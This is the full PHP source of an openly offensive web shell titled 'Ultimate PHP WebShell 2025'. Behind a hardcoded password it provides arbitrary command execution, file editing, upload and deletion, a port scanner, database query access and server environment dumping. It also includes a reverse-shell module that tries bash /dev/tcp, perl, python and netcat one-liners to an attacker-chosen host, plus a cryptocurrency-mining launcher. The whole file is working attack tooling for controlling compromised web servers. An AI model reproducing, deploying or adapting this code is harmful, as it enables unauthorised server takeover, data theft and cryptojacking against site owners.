<?php
/**
 * Ultimate PHP WebShell 2025
 * Optimized for: safe_mode=off, shell_exec=on, popen=on, disable_functions=none
 * Features: Command execution, file management, database access, network tools
 */

error_reporting(0);
ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '-1');

// Authentication
$auth_pass = 'cpool'; // Change this
session_start();

if (!isset($_SESSION['authenticated']) && isset($_POST['pass'])) {
    if ($_POST['pass'] === $auth_pass) {
        $_SESSION['authenticated'] = true;
    }
}

if (!isset($_SESSION['authenticated'])) {
    ?>
    <!DOCTYPE html>
    <html><head><title>Authentication Required</title></head>
    <body style="background:#000;color:#0f0;font-family:monospace;">
    <center><h2>Access Control</h2>
    <form method="post">
    <input type="password" name="pass" placeholder="Enter access code" style="background:#333;color:#0f0;border:1px solid #0f0;">
    <input type="submit" value="Access" style="background:#333;color:#0f0;border:1px solid #0f0;">
    </form></center>
    </body></html>
    <?php
    exit;
}

// Main interface
$action = $_GET['action'] ?? 'main';
$cwd = $_POST['cwd'] ?? getcwd();

?>
<!DOCTYPE html>
<html>
<head>
    <title>Ultimate WebShell</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; margin: 0; padding: 10px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .menu { background: #111; padding: 10px; margin-bottom: 10px; border: 1px solid #0f0; }
        .menu a { color: #0f0; text-decoration: none; margin-right: 15px; }
        .menu a:hover { background: #0f0; color: #000; padding: 2px; }
        .content { background: #111; padding: 15px; border: 1px solid #0f0; }
        input, textarea, select { background: #333; color: #0f0; border: 1px solid #0f0; padding: 5px; }
        button { background: #333; color: #0f0; border: 1px solid #0f0; padding: 5px 10px; cursor: pointer; }
        button:hover { background: #0f0; color: #000; }
        .output { background: #222; padding: 10px; margin-top: 10px; border-left: 3px solid #0f0; white-space: pre-wrap; }
        .file-list { margin-top: 10px; }
        .file-item { padding: 5px; border-bottom: 1px solid #333; }
        .dir { color: #ff0; }
        .file { color: #0f0; }
        .error { color: #f00; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #0f0; padding: 8px; text-align: left; }
        th { background: #333; }
    </style>
</head>
<body>
<div class="container">
    <div class="menu">
        <a href="?action=main">Command Exec</a>
        <a href="?action=files">File Manager</a>
        <a href="?action=upload">Upload</a>
        <a href="?action=network">Network Tools</a>
        <a href="?action=database">Database</a>
        <a href="?action=info">System Info</a>
        <a href="?action=reverse">Reverse Shell</a>
        <a href="?action=cpool">C-Pool</a>
        <a href="?action=logout" onclick="return confirm('Logout?')">Logout</a>
    </div>

    <div class="content">
        <?php
        if ($action === 'logout') {
            session_destroy();
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        }
        
        switch ($action) {
            case 'main':
                handleCommandExecution();
                break;
            case 'files':
                handleFileManager();
                break;
            case 'upload':
                handleFileUpload();
                break;
            case 'network':
                handleNetworkTools();
                break;
            case 'database':
                handleDatabase();
                break;
            case 'info':
                handleSystemInfo();
                break;
            case 'reverse':
                handleReverseShell();
                break;
            case 'cpool':
                handleCPool();
                break;
            default:
                handleCommandExecution();
        }
        ?>
    </div>
</div>

<?php
function handleCommandExecution() {
    global $cwd;
    ?>
    <h3>Command Execution Terminal</h3>
    <form method="post">
        <p>Current Directory: <strong><?= htmlspecialchars($cwd) ?></strong></p>
        <input type="hidden" name="cwd" value="<?= htmlspecialchars($cwd) ?>">
        <input type="text" name="cmd" placeholder="Enter command..." style="width: 70%;" autofocus>
        <button type="submit">Execute</button>
        <button type="button" onclick="document.querySelector('[name=cmd]').value='ls -la'">ls -la</button>
        <button type="button" onclick="document.querySelector('[name=cmd]').value='ps aux'">ps aux</button>
        <button type="button" onclick="document.querySelector('[name=cmd]').value='uname -a'">uname -a</button>
    </form>
    
    <?php
    if (isset($_POST['cmd'])) {
        $cmd = $_POST['cmd'];
        if (!empty($cmd)) {
            echo '<div class="output">';
            echo '<strong>$ ' . htmlspecialchars($cmd) . '</strong><br><br>';
            
            // Change directory if cd command
            if (preg_match('/^cd\s+(.+)/', $cmd, $matches)) {
                $newDir = trim($matches[1]);
                if ($newDir === '..') {
                    $cwd = dirname($cwd);
                } elseif ($newDir === '~') {
                    $cwd = $_SERVER['HOME'] ?? '/';
                } elseif (is_dir($newDir)) {
                    $cwd = realpath($newDir);
                } elseif (is_dir($cwd . '/' . $newDir)) {
                    $cwd = realpath($cwd . '/' . $newDir);
                } else {
                    echo '<span class="error">Directory not found: ' . htmlspecialchars($newDir) . '</span>';
                }
                echo 'Changed to: ' . htmlspecialchars($cwd);
            } else {
                // Execute command
                $output = executeCommand($cmd, $cwd);
                echo htmlspecialchars($output);
            }
            echo '</div>';
        }
    }
}

function handleFileManager() {
    global $cwd;
    $path = $_GET['path'] ?? $cwd;
    
    if (isset($_POST['action'])) {
        switch ($_POST['action']) {
            case 'delete':
                $file = $_POST['file'];
                if (is_file($file)) {
                    unlink($file) ? print_success("File deleted: $file") : print_error("Failed to delete: $file");
                } elseif (is_dir($file)) {
                    rmdir($file) ? print_success("Directory deleted: $file") : print_error("Failed to delete: $file");
                }
                break;
            case 'edit':
                if (isset($_POST['content'])) {
                    file_put_contents($_POST['file'], $_POST['content']) !== false ? 
                        print_success("File saved: " . $_POST['file']) : 
                        print_error("Failed to save file");
                }
                break;
            case 'chmod':
                $file = $_POST['file'];
                $perms = octdec($_POST['perms']);
                chmod($file, $perms) ? print_success("Permissions changed: $file") : print_error("Failed to change permissions");
                break;
        }
    }
    
    if (isset($_GET['edit'])) {
        $file = $_GET['edit'];
        echo '<h3>Edit File: ' . htmlspecialchars($file) . '</h3>';
        echo '<form method="post">';
        echo '<input type="hidden" name="action" value="edit">';
        echo '<input type="hidden" name="file" value="' . htmlspecialchars($file) . '">';
        echo '<textarea name="content" style="width:100%;height:400px;">' . htmlspecialchars(file_get_contents($file)) . '</textarea><br>';
        echo '<button type="submit">Save</button>';
        echo '</form>';
        return;
    }
    
    ?>
    <h3>File Manager: <?= htmlspecialchars($path) ?></h3>
    <form method="get">
        <input type="hidden" name="action" value="files">
        <input type="text" name="path" value="<?= htmlspecialchars($path) ?>" style="width: 80%;">
        <button type="submit">Go</button>
    </form>
    
    <div class="file-list">
        <?php
        if ($path !== '/') {
            echo '<div class="file-item dir"><a href="?action=files&path=' . urlencode(dirname($path)) . '">[Parent Directory]</a></div>';
        }
        
        $files = scandir($path);
        foreach ($files as $file) {
            if ($file === '.' || $file === '..') continue;
            
            $fullPath = $path . '/' . $file;
            $isDir = is_dir($fullPath);
            $size = $isDir ? 'DIR' : formatBytes(filesize($fullPath));
            $perms = substr(sprintf('%o', fileperms($fullPath)), -4);
            $modified = date('Y-m-d H:i:s', filemtime($fullPath));
            
            echo '<div class="file-item ' . ($isDir ? 'dir' : 'file') . '">';
            if ($isDir) {
                echo '<a href="?action=files&path=' . urlencode($fullPath) . '">[DIR] ' . htmlspecialchars($file) . '</a>';
            } else {
                echo '<span>' . htmlspecialchars($file) . '</span>';
                echo ' <a href="?action=files&edit=' . urlencode($fullPath) . '">[Edit]</a>';
                echo ' <a href="' . $_SERVER['PHP_SELF'] . '?download=' . urlencode($fullPath) . '">[Download]</a>';
            }
            echo " | $size | $perms | $modified";
            echo ' <a href="#" onclick="deleteFile(\'' . addslashes($fullPath) . '\')">[Delete]</a>';
            echo '</div>';
        }
        ?>
    </div>
    
    <script>
    function deleteFile(file) {
        if (confirm('Delete: ' + file + '?')) {
            var form = document.createElement('form');
            form.method = 'post';
            form.innerHTML = '<input type="hidden" name="action" value="delete"><input type="hidden" name="file" value="' + file + '">';
            document.body.appendChild(form);
            form.submit();
        }
    }
    </script>
    <?php
}

function handleFileUpload() {
    if (isset($_POST['upload'])) {
        $target = $_POST['target_dir'] . '/' . $_FILES['file']['name'];
        if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
            print_success("File uploaded: $target");
        } else {
            print_error("Upload failed");
        }
    }
    
    ?>
    <h3>File Upload</h3>
    <form method="post" enctype="multipart/form-data">
        <p>Target Directory: <input type="text" name="target_dir" value="<?= getcwd() ?>" style="width: 60%;"></p>
        <p>Select File: <input type="file" name="file" required></p>
        <button type="submit" name="upload">Upload</button>
    </form>
    <?php
}

function handleNetworkTools() {
    if (isset($_POST['network_action'])) {
        switch ($_POST['network_action']) {
            case 'ping':
                $host = $_POST['host'];
                $output = executeCommand("ping -c 4 $host");
                echo '<div class="output">' . htmlspecialchars($output) . '</div>';
                break;
            case 'nslookup':
                $host = $_POST['host'];
                $output = executeCommand("nslookup $host");
                echo '<div class="output">' . htmlspecialchars($output) . '</div>';
                break;
            case 'portscan':
                $host = $_POST['host'];
                $ports = $_POST['ports'] ?: '22,23,25,53,80,110,443,993,995';
                echo '<div class="output">Port scan results for ' . htmlspecialchars($host) . ':<br>';
                foreach (explode(',', $ports) as $port) {
                    $port = trim($port);
                    $connection = @fsockopen($host, $port, $errno, $errstr, 2);
                    if ($connection) {
                        echo "Port $port: OPEN<br>";
                        fclose($connection);
                    } else {
                        echo "Port $port: CLOSED<br>";
                    }
                }
                echo '</div>';
                break;
            case 'wget':
                $url = $_POST['url'];
                $output = executeCommand("wget -O- '$url'");
                echo '<div class="output">' . htmlspecialchars($output) . '</div>';
                break;
        }
    }
    
    ?>
    <h3>Network Tools</h3>
    <form method="post">
        <input type="hidden" name="network_action" value="ping">
        <p>Ping: <input type="text" name="host" placeholder="hostname or IP"> <button type="submit">Ping</button></p>
    </form>
    
    <form method="post">
        <input type="hidden" name="network_action" value="nslookup">
        <p>DNS Lookup: <input type="text" name="host" placeholder="hostname"> <button type="submit">Lookup</button></p>
    </form>
    
    <form method="post">
        <input type="hidden" name="network_action" value="portscan">
        <p>Port Scan: <input type="text" name="host" placeholder="hostname or IP">
        <input type="text" name="ports" placeholder="22,80,443" value="22,23,25,53,80,110,443,993,995">
        <button type="submit">Scan</button></p>
    </form>
    
    <form method="post">
        <input type="hidden" name="network_action" value="wget">
        <p>Web Request: <input type="text" name="url" placeholder="http://example.com" style="width: 60%;"> <button type="submit">Fetch</button></p>
    </form>
    <?php
}

function handleDatabase() {
    if (isset($_POST['db_action'])) {
        $host = $_POST['host'] ?: 'localhost';
        $user = $_POST['user'];
        $pass = $_POST['pass'];
        $database = $_POST['database'] ?: '';
        $query = $_POST['query'] ?: '';
        
        try {
            if (function_exists('mysqli_connect')) {
                $conn = mysqli_connect($host, $user, $pass, $database);
                if ($conn) {
                    print_success("Connected to MySQL: $host");
                    if (!empty($query)) {
                        $result = mysqli_query($conn, $query);
                        if ($result) {
                            echo '<table><tr>';
                            if (mysqli_num_rows($result) > 0) {
                                // Show column headers
                                $fields = mysqli_fetch_fields($result);
                                foreach ($fields as $field) {
                                    echo '<th>' . htmlspecialchars($field->name) . '</th>';
                                }
                                echo '</tr>';
                                
                                // Show data
                                while ($row = mysqli_fetch_assoc($result)) {
                                    echo '<tr>';
                                    foreach ($row as $value) {
                                        echo '<td>' . htmlspecialchars($value) . '</td>';
                                    }
                                    echo '</tr>';
                                }
                            }
                            echo '</table>';
                        } else {
                            print_error("Query error: " . mysqli_error($conn));
                        }
                    }
                    mysqli_close($conn);
                } else {
                    print_error("Connection failed: " . mysqli_connect_error());
                }
            } else {
                print_error("MySQLi extension not available");
            }
        } catch (Exception $e) {
            print_error("Database error: " . $e->getMessage());
        }
    }
    
    ?>
    <h3>Database Access</h3>
    <form method="post">
        <input type="hidden" name="db_action" value="connect">
        <table>
            <tr><td>Host:</td><td><input type="text" name="host" value="localhost"></td></tr>
            <tr><td>Username:</td><td><input type="text" name="user"></td></tr>
            <tr><td>Password:</td><td><input type="password" name="pass"></td></tr>
            <tr><td>Database:</td><td><input type="text" name="database"></td></tr>
            <tr><td>Query:</td><td><textarea name="query" placeholder="SELECT * FROM users" style="width: 100%; height: 100px;"></textarea></td></tr>
        </table>
        <button type="submit">Execute</button>
    </form>
    <?php
}

function handleSystemInfo() {
    ?>
    <h3>System Information</h3>
    <table>
        <tr><th>Setting</th><th>Value</th></tr>
        <tr><td>PHP Version</td><td><?= phpversion() ?></td></tr>
        <tr><td>Server Software</td><td><?= $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown' ?></td></tr>
        <tr><td>System</td><td><?= php_uname() ?></td></tr>
        <tr><td>Current User</td><td><?= get_current_user() ?></td></tr>
        <tr><td>Document Root</td><td><?= $_SERVER['DOCUMENT_ROOT'] ?? 'Unknown' ?></td></tr>
        <tr><td>Script Path</td><td><?= __FILE__ ?></td></tr>
        <tr><td>Safe Mode</td><td><?= ini_get('safe_mode') ? 'ON' : 'OFF' ?></td></tr>
        <tr><td>Disabled Functions</td><td><?= ini_get('disable_functions') ?: 'None' ?></td></tr>
        <tr><td>Memory Limit</td><td><?= ini_get('memory_limit') ?></td></tr>
        <tr><td>Max Execution Time</td><td><?= ini_get('max_execution_time') ?></td></tr>
        <tr><td>Upload Max Filesize</td><td><?= ini_get('upload_max_filesize') ?></td></tr>
        <tr><td>Post Max Size</td><td><?= ini_get('post_max_size') ?></td></tr>
    </table>
    
    <h4>Loaded Extensions</h4>
    <div class="output"><?= implode(', ', get_loaded_extensions()) ?></div>
    
    <h4>Environment Variables</h4>
    <table>
        <?php foreach ($_SERVER as $key => $value): ?>
        <tr><td><?= htmlspecialchars($key) ?></td><td><?= htmlspecialchars($value) ?></td></tr>
        <?php endforeach; ?>
    </table>
    <?php
}

function handleReverseShell() {
    if (isset($_POST['reverse_action'])) {
        $host = $_POST['host'];
        $port = $_POST['port'];
        
        echo '<div class="output">Attempting reverse shell to ' . htmlspecialchars($host) . ':' . htmlspecialchars($port) . '<br>';
        
        // Try different methods
        $methods = [
            "bash -i >& /dev/tcp/$host/$port 0>&1",
            "perl -e 'use Socket;\$i=\"$host\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
            "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$host\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "nc -e /bin/sh $host $port"
        ];
        
        foreach ($methods as $i => $method) {
            echo "Method " . ($i+1) . ": " . htmlspecialchars($method) . "<br>";
            $output = executeCommand($method);
            if (!empty($output)) {
                echo "Output: " . htmlspecialchars($output) . "<br>";
            }
        }
        echo '</div>';
    }
    
    ?>
    <h3>Reverse Shell</h3>
    <form method="post">
        <input type="hidden" name="reverse_action" value="connect">
        <p>Host: <input type="text" name="host" placeholder="your.server.com" required></p>
        <p>Port: <input type="number" name="port" placeholder="4444" required></p>
        <button type="submit">Connect</button>
    </form>
    <div class="output">
        <strong>Setup on your server:</strong><br>
        nc -lvp 4444<br>
        <br>
        <strong>Or use socat:</strong><br>
        socat file:`tty`,raw,echo=0 tcp-listen:4444
    </div>
    <?php
}

function handleCPool() {
    if (isset($_POST['cpool_action'])) {
        switch ($_POST['cpool_action']) {
            case 'mine':
                $pool = $_POST['pool'];
                $wallet = $_POST['wallet'];
                $threads = $_POST['threads'] ?: '1';
                
                // CPU mining command
                $cmd = "cpuminer -a scrypt -o $pool -u $wallet -p x -t $threads";
                echo '<div class="output">Starting mining:<br>' . htmlspecialchars($cmd) . '</div>';
                executeCommand($cmd . ' > /dev/null 2>&1 &');
                break;
                
            case 'stop':
                executeCommand('pkill -f cpuminer');
                executeCommand('pkill -f xmrig');
                print_success("Mining processes stopped");
                break;
                
            case 'status':
                $ps = executeCommand('ps aux | grep -E "(cpuminer|xmrig)" | grep -v grep');
                echo '<div class="output">Mining processes:<br>' . htmlspecialchars($ps) . '</div>';
                break;
        }
    }
    
    ?>
    <h3>C-Pool Mining</h3>
    <form method="post">
        <input type="hidden" name="cpool_action" value="mine">
        <table>
            <tr><td>Pool URL:</td><td><input type="text" name="pool" value="stratum+tcp://pool.example.com:4444" style="width: 100%;"></td></tr>
            <tr><td>Wallet Address:</td><td><input type="text" name="wallet" placeholder="Your wallet address" style="width: 100%;"></td></tr>
            <tr><td>Threads:</td><td><input type="number" name="threads" value="1" min="1" max="16"></td></tr>
        </table>
        <button type="submit">Start Mining</button>
    </form>
    
    <form method="post" style="display: inline;">
        <input type="hidden" name="cpool_action" value="status">
        <button type="submit">Check Status</button>
    </form>
    
    <form method="post" style="display: inline;">
        <input type="hidden" name="cpool_action" value="stop">
        <button type="submit">Stop Mining</button>
    </form>
    <?php
}

// Utility functions
function executeCommand($cmd, $cwd = null) {
    if ($cwd) {
        $cmd = "cd " . escapeshellarg($cwd) . " && $cmd";
    }
    
    // Try different execution methods
    if (function_exists('shell_exec')) {
        return shell_exec($cmd . ' 2>&1');
    } elseif (function_exists('exec')) {
        exec($cmd . ' 2>&1', $output);
        return implode("\n", $output);
    } elseif (function_exists('system')) {
        ob_start();
        system($cmd . ' 2>&1');
        return ob_get_clean();
    } elseif (function_exists('popen')) {
        $handle = popen($cmd . ' 2>&1', 'r');
        $output = '';
        while (!feof($handle)) {
            $output .= fread($handle, 4096);
        }
        pclose($handle);
        return $output;
    }
    
    return 'Command execution not available';
}

function print_success($msg) {
    echo '<div style="color: #0f0; border: 1px solid #0f0; padding: 10px; margin: 10px 0;">' . htmlspecialchars($msg) . '</div>';
}

function print_error($msg) {
    echo '<div style="color: #f00; border: 1px solid #f00; padding: 10px; margin: 10px 0;">' . htmlspecialchars($msg) . '</div>';
}

function formatBytes($size, $precision = 2) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    for ($i = 0; $size >= 1024 && $i < count($units) - 1; $i++) {
        $size /= 1024;
    }
    return round($size, $precision) . ' ' . $units[$i];
}

// Handle file download
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file) && is_file($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}
?>

</body>
</html>